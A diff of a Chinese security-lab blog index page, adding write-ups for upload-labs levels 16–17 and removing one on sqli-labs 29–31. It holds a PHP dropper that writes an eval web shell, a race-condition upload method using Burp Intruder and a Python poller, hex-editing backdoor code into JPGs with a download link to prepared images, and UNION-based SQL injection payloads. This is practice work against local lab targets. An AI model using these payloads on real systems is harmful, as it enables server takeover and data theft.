@@ -64,6 +64,55 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-34" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/03/04/page-34/" class="article-date">
+  <time datetime="2021-03-04T07:05:24.000Z" itemprop="datePublished">2021-03-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/03/04/page-34/">upload labs 17</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这关叫做条件竞争 虚拟网卡好像是数据包速率问题反正没试成功过___*( ￣皿￣)/#____</p>
+<p>源码这边说后台先把文件保存进文件夹再判断后缀是否合法 </p>
+<p>那么多线程的情况下就可能出现文件文件夹的文件没处理完就直接绕过了防护</p>
+<p>先创建一个<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST["x"])?>’);?&gt;</p>
+<p>代码为这个的php文件 意思是当访问这个之后就会创建一个shell2.php的文件并写入一句话木马<br><em>fopen()函数的用法</em><br><em>1、fopen() 函数打开一个文件或 URL。</em><br><em>2、如果 fopen() 失败，它将返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 ‘@’ 来隐藏错误输出。</em><br><em>“r” （只读方式打开，将文件指针指向文件头）</em><br><em>“r+” （读写方式打开，将文件指针指向文件头）</em><br><em>“w” （写入方式打开，清除文件内容，如果文件不存在则尝试创建之）</em><br><em>“w+” （读写方式打开，清除文件内容，如果文件不存在则尝试创建之）</em><br><em>“a” （写入方式打开，将文件指针指向文件末尾进行写入，如果文件不存在则尝试创建之）</em><br><em>“a+” （读写方式打开，通过将文件指针指向文件末尾进行写入来保存文件内容）</em><br><em>“x” （创建一个新的文件并以写入方式打开，如果文件已存在则返回 FALSE 和一个错误）</em><br><em>“x+” （创建一个新的文件并以读写方式打开，如果文件已存在则返回 FALSE 和一个错误）</em></p>
+<p>burp抓包然后 send to intruder</p>
+<p>设置数据包无限重发 payloads那边 payload type选择null payloads 下面的 continue indefinitely选上  然后还要弄个python脚本来检测有没有上传上去</p>
+<p>import requests<br>url = “<a target="_blank" rel="noopener" href="http://127.0.0.1/upload-labs/upload/aaa.php&quot;">http://127.0.0.1/upload-labs/upload/aaa.php&quot;</a><br>while True:<br>    html = requests.get(url)<br>    if html.status_code == 200:<br>        print(“OK”)<br>        break<br>    else:<br>        print(“NO”)   **脚本代码 ** 如果访问的了就会显示ok 然后就会创建 shell.php 的文件</p>
+<p>burp attack之前就需要运行这个脚本 </p>
+<p>然后就可以连接了 菜刀开启</p>
+<p>也有不用python脚本的方法手动不断访问<a target="_blank" rel="noopener" href="http://127.0.0.1/upload-labs/upload/aaa.php">http://127.0.0.1/upload-labs/upload/aaa.php</a></p>
+<p>知道访问成功为止</p>
+<p>但是呢这我到现在都没成功</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/03/04/page-34/" data-id="cklujrzf50000hgv7es0t2344" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-page-33" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/03/01/page-33/" class="article-date">
@@ -78,7 +127,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/03/01/page-33/">十六实在不会</a>
+      <a class="article-title" href="/2021/03/01/page-33/">十六看懂了</a>
     </h1>
   
 
@@ -151,6 +200,11 @@
 <p>需要注意的是,有一些jpg图片不能被处理,所以要多尝试一些jpg图片.</p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/notice">https://xz.aliyun.com/notice</a>)</p>
 <p>转载自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657#toc-7">https://xz.aliyun.com/t/2657#toc-7</a>  实在是看不懂之后再研究一下</p>
+<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1mkiyUkiwLtPN9_y_sPGXBA">https://pan.baidu.com/s/1mkiyUkiwLtPN9_y_sPGXBA</a> 提取码：aaaa</p>
+<p><strong>其实这关就是要绕过二次渲染 然后用十六进制编辑器编辑一下</strong></p>
+<p><strong>先找一下上传到服务器上的图片和本地图片不变的代码是那一部分然后就可以把后门代码编辑进去就可成功上传</strong></p>
+<p><strong>链接里的文件是大佬 o(<em>^▽^</em>)┛已经制作好了的图片可以直接使用</strong></p>
+<p><strong>然后配合漏洞菜刀使用即可</strong></p>
 
       
     </div>
@@ -569,51 +623,6 @@
 
 
   
-    <article id="post-page-23" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/02/07/page-23/" class="article-date">
-  <time datetime="2021-02-07T07:58:08.000Z" itemprop="datePublished">2021-02-07</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/07/page-23/">sqlilabs 29 30 31</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>这关拥有很强大的防火墙 </p>
-<p>所以需要使用http参数污染 通<img src="https://img-blog.csdnimg.cn/20201011115133598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>过在http请求中插入特定参数发起攻击  原理差不多是这样</p>
-<p>后端是apache 那么吧参数放在后面 即可 传递两个id 前者合法后者为想要注入的内容</p>
-<p>?id=1&amp;id=-1’ union select 1,2,3 –+ 显位</p>
-<p>?id=1&amp;id=-1’ union select 1,2,database() –+  数据库</p>
-<p>之后就是一顿操作组合拳 就可以了和之前的一样的语句</p>
-<p>30的话双引号就ok了 没别的什么区别了</p>
-<p>31就双引号加括号 就可以了</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/07/page-23/" data-id="ckkuuvi8l0000icv7eyay1q9n" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -650,7 +659,11 @@
       <ul>
         
           <li>
-            <a href="/2021/03/01/page-33/">十六实在不会</a>
+            <a href="/2021/03/04/page-34/">upload labs 17</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/01/page-33/">十六看懂了</a>
           </li>
         
           <li>
@@ -663,10 +676,6 @@
         
           <li>
             <a href="/2021/02/18/page-30/">sqlilabs 50 51 52 53 54 55 56 57 58-65</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/18/page-29/">sqlilabs 46 47 48 49</a>
           </li>
         
       </ul>
